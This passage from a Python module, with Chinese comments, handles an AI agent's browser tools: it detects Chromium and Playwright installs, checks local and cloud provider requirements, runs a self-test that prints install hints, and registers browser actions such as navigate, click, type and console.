    global _cached_browser_engine, _browser_engine_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _discover_homebrew_node_dirs.cache_clear()
    _cached_command_timeout = None
    _command_timeout_resolved = False
    _cached_chromium_installed = None
    _cached_browser_engine = None
    _browser_engine_resolved = False

# ============================================================================
# 依赖检查
# ============================================================================


# Chromium 发现结果的缓存。由 _reset_browser_caches 失效。
_cached_chromium_installed: Optional[bool] = None


def _chromium_search_roots() -> List[str]:
    """要扫描查找 Chromium / headless-shell 构建的目录。

    顺序与 agent-browser 和 Playwright 实际探测的顺序一致：

    1. 设置了 ``PLAYWRIGHT_BROWSERS_PATH`` 时（Docker 镜像把它设为
       ``/opt/hermes/.playwright``）。
    2. ``~/.cache/ms-playwright`` —— Playwright 在 Linux/macOS 上的默认路径。
    3. ``~/Library/Caches/ms-playwright`` —— Playwright 在 macOS 上的默认路径。
    4. ``%USERPROFILE%\\AppData\\Local\\ms-playwright`` —— Playwright 在
       Windows 上的默认路径。
    """
    roots: List[str] = []
    env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA") or os.path.join(
            home, "AppData", "Local"
        )
        roots.append(os.path.join(local, "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """当磁盘上存在可用的 Chromium（或 headless-shell）构建时返回 True。

    依次检查：

    1. ``AGENT_BROWSER_EXECUTABLE_PATH`` 环境变量 —— 把 agent-browser 指向一个
       预装 Chrome/Chromium 的官方方式。
    2. PATH 中的系统 Chrome/Chromium（``google-chrome``、``chromium``、
       ``chromium-browser``、``chrome``）。
    3. Playwright 的浏览器缓存（当前逻辑）—— 包含
       ``chromium-*`` 或 ``chromium_headless_shell-*`` 的目录。

    agent-browser（0.26+）会把 Playwright 的 chromium / headless-shell 构建下载
    到 ``PLAYWRIGHT_BROWSERS_PATH``，并且上述三者至少存在一个才会启动。
    若没有浏览器二进制，CLI 在首次使用时会一直挂起，直到命令超时
    （通常约 30 秒）。用本检查把守工具，可以避免对外宣传一个运行时必定失败
    的能力。
    """
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. AGENT_BROWSER_EXECUTABLE_PATH —— 用户显式配置的浏览器
    ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
    if ab_path:
        if os.path.isfile(ab_path) or shutil.which(ab_path):
            _cached_chromium_installed = True
            return True

    # 2. PATH 中的系统 Chrome/Chromium（常见名称）
    system_chrome = (
        shutil.which("google-chrome")
        or shutil.which("chromium")
        or shutil.which("chromium-browser")
        or shutil.which("chrome")
    )
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright 浏览器缓存（旧路径 —— chromium-* / chromium_headless_shell-* 目录）
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright 把它们命名为 ``chromium-<build>`` 和
        # ``chromium_headless_shell-<build>``；agent-browser 两者都接受。
        for entry in entries:
            if entry.startswith("chromium-") or entry.startswith(
                "chromium_headless_shell-"
            ):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


def _running_in_docker() -> bool:
    """尽力而为地检测当前是否运行在 Docker 容器内。"""
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", "rt", encoding="utf-8") as fp:
            return "docker" in fp.read()
    except OSError:
        return False


def check_browser_requirements() -> bool:
    """
    检查浏览器工具的依赖是否满足。

    在**本地模式**（未配置云端 provider）下：必须能找到 ``agent-browser``
    CLI。默认 Chrome 引擎以及回退/截图路径都需要 Chrome/Chromium，
    但纯 Lightpanda 的文本导航/快照工作流不需要。

    在**云端模式**（Browserbase、Browser Use 或 Firecrawl）下：必须存在
    CLI 以及该 provider 所需的凭据。云端 provider 自带 Chromium，因此
    无需本地浏览器二进制。

    返回：
        全部满足返回 True，否则返回 False
    """
    # Camofox 后端 —— 只需要服务器 URL，不需要 agent-browser CLI
    if _is_camofox_mode():
        return True

    # CDP 覆盖模式可以连接到一个已存在的远端/本地浏览器端点，
    # 无需本地 PATH 上有 agent-browser 二进制。
    if _get_cdp_override():
        return True

    # 本地启动与云端 provider 流程都需要 agent-browser CLI。
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return False

    # 在 Termux 上，裸 npx 兜底太脆弱，不能算作满足本地浏览器依赖。
    # 要求真正安装过一次（全局或本地），避免浏览器工具被声明为可用、
    # 实际首次使用就会失败。
    if _requires_real_termux_browser_install(browser_cmd):
        return False

    # 云端模式下还需要 provider 凭据。云端浏览器不需要本地 Chromium 二进制。
    provider = _get_cloud_provider()
    if provider is not None:
        return provider.is_configured()

    # 本地模式搭配 Lightpanda 时，无需本地 Chromium 即可提供文本/导航工具。
    # Chrome 回退、截图、browser_vision 若被调用，仍会返回可操作的
    # Chromium 安装错误。
    if _using_lightpanda_engine():
        return True

    # 本地 Chrome 模式：agent-browser 需要磁盘上有 Chromium 构建。
    # 否则 CLI 在首次使用时会挂起，直到命令超时。
    if not _chromium_installed():
        return False

    return True


def check_browser_vision_requirements() -> bool:
    """判断 ``browser_vision`` 是否应向模型声明可用。

    需要同时满足：浏览器可用（``check_browser_requirements``）且能解析出
    一个视觉后端。若不做视觉检查，即使没有配置视觉 provider，该工具仍会
    留在模型工具列表中，调用时再以晦涩的 provider 侧错误失败，例如
    ``unknown variant `image_url`, expected `text```（issue #31179）。
    """
    if not check_browser_requirements():
        return False
    try:
        from tools.vision_tools import check_vision_requirements
    except ImportError:
        return False
    return check_vision_requirements()


# ============================================================================
# 模块自测
# ============================================================================

if __name__ == "__main__":
    """
    直接运行时的简单测试/演示
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    _cp = _get_cloud_provider()
    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
    print(f"   Mode: {mode}")

    # 检查依赖
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            browser_cmd = _find_agent_browser()
            if _requires_real_termux_browser_install(browser_cmd):
                print("   - bare npx fallback found (insufficient on Termux local mode)")
                print(f"     Install: {_browser_install_hint()}")
            elif _cp is None and not _chromium_installed():
                print("   - Chromium browser binary not found")
                searched = ", ".join(_chromium_search_roots()) or "(no candidate paths)"
                print(f"     Searched: {searched}")
                if _running_in_docker():
                    print(
                        "     Docker: pull the latest image — the current one "
                        "predates the bundled Chromium install"
                    )
                    print("       docker pull ghcr.io/nousresearch/hermes-agent:latest")
                else:
                    print("     Install it with:")
                    print("       npx agent-browser install --with-deps")
                    print("     Or:  npx playwright install --with-deps chromium")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")
        if _cp is not None and not _cp.is_configured():
            print(f"   - {_cp.provider_name()} credentials not configured")
            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# 注册表
# ---------------------------------------------------------------------------
from tools.registry import registry, tool_error

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}

registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: browser_snapshot(
        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
    check_fn=check_browser_requirements,
    emoji="📸",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="📜",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
    check_fn=check_browser_vision_requirements,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖥️",
)
